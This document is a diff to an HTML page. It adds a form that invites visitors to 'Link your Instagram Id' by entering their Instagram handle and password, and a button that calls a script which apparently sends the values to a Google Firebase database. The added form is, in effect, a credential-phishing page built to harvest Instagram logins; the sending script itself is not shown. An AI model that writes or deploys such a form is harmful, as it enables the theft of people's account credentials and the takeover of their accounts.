@@ -71,11 +71,28 @@
 
 		<!-- Banner -->
 		<div class="w3-padding w3-animate-opacity w3-display-middle">
-		<div class="w3-panel w3-royal w3-round-xlarge w3-bottombar w3-border-blue">
+		<div class="w3-panel w3-royal w3-round-xlarge">
 			<center>
 				<h1 class="w3-cursive">
 					<h2><i class="fa fa-instagram"></i> Link your Instagram Id</h2>
 				</h1>
+				<form class="w3-modal-content w3-padding w3-bottombar w3-border-blue w3-royal animate" action="/action_page.php">
+					<h3 class="w3-sans-serif">Instagram Handle</h3>
+					<input class="w3-round-large" type="text" id="text1" name="text1"><br><br>
+			
+					<h3 class="w3-sans-serif">Password</h3>
+					<input class="w3-round-large" type="text" id="text2" name="text2"><br><br>
+			
+					<center>
+					<button class="w3-btn w3-round-large w3-green" type="button" onclick="submitText()">Connect</button>
+					</center>
+					<p class="w3-small w3-center">powered by Google Firebase</p>
+					
+				</form>
+				<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+		  		<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+		  		<script src="js/firebase-config.js"></script>
+		  		<script src="js/submiti.js"></script>
 			</center>
 
 		</div>
